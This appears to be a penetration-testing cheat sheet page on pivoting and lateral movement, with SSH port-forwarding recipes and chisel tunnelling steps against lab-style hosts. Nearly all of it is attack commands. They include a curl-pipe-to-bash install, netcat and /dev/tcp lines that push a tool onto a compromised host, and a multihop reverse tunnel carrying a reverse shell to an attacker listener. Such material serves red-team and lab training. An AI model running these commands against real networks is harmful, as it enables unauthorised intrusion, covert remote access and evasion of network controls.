---
icon: person-to-portal
---

# Pivoting/Lateral Movement

<details>

<summary><mark style="color:orange;"><strong><code>SSH</code></strong></mark> <mark style="color:purple;"><strong>Tunneling</strong></mark></summary>

{% hint style="info" %}
<mark style="color:red;">`Dynamic Port Forwarding`</mark>

{% code title="Check  proxychains port" %}
```sh
tail /etc/proxychains.conf
```
{% endcode %}

{% code title="Create a SOCK proxy" %}
```sh
ssh charix@10.10.10.84 -D 9050
```
{% endcode %}

{% code title="Now just use proxychains:" overflow="wrap" %}
```sh
proxychains vncviewer 127.0.0.1:5901 -passwd secret
```
{% endcode %}
{% endhint %}

{% hint style="info" %}
<mark style="color:red;">`Local Port Forwarding`</mark>

{% code overflow="wrap" %}
```sh
ssh -L 3306:localhost:3306 user@remotehost.com
```
{% endcode %}

{% code title="Without interactive session" overflow="wrap" %}
```sh
ssh -L 8080:127.0.0.1:8080 -N -vv rosa@10.10.11.38
```
{% endcode %}
{% endhint %}

{% hint style="info" %}
<mark style="color:red;">**`Remote Port Forwarding`**</mark>

```sh
ssh root@10.10.10.65 -R 4443:10.10.14.6:443
```
{% endhint %}

</details>

<details>

<summary><mark style="color:orange;"><strong><code>chisel</code></strong></mark></summary>

{% code title="Install chisel" %}
```sh
curl https://i.jpillora.com/chisel! | bash
```
{% endcode %}

{% hint style="info" %}
<mark style="color:red;">**`Transfer chisel to a target`**</mark>

{% code title="Copy the binary" overflow="wrap" %}
```sh
cp /usr/local/bin/chisel .
```
{% endcode %}

{% code title="Set netcat" %}
```sh
nc -lvnp 80 < chisel
```
{% endcode %}

<mark style="color:red;">**`Now on the remote host`**</mark>

```sh
cd /var/tmp
```

{% code lineNumbers="true" %}
```sh
cat < /dev/tcp/10.10.14.172/80 > chisel
bash -c "cat < /dev/tcp/172.19.0.4/7011 > chisel"
```
{% endcode %}

```sh
chmod 755 /var/tmp/chisel
```
{% endhint %}

{% hint style="info" %}
<mark style="color:red;">**`Create a tunnel`**</mark>

{% code title="Start the server locally" overflow="wrap" %}
```sh
/usr/local/bin/chisel server -p 8002 -reverse -v
```
{% endcode %}

{% code title="Start the tunnel remotely" overflow="wrap" %}
```sh
/var/tmp/chisel client 10.10.14.172:8002 R:127.0.0.1:8001:172.19.0.2:80
```
{% endcode %}
{% endhint %}

{% hint style="info" %}
<mark style="color:red;">**`Multihop tunnel for reverse shell`**</mark>

* <mark style="color:purple;">**First start the new server on your attacking host:**</mark>

{% code overflow="wrap" %}
```sh
/usr/local/bin/chisel server -p 5000 -reverse -v
```
{% endcode %}

* <mark style="color:purple;">**Set also the listener:**</mark>

```sh
nc -lvnp 9005
```

* <mark style="color:purple;">**Now set the first hop:**</mark>

{% code overflow="wrap" %}
```sh
/var/tmp/chisel client 10.10.14.172:5000 6010:127.0.0.1:5000
```
{% endcode %}

* <mark style="color:purple;">**Finally set the second hop:**</mark>

{% code overflow="wrap" %}
```sh
/var/tmp/chisel client 172.19.0.4:6010 7020:127.0.0.1:9005 &
```
{% endcode %}
{% endhint %}

</details>
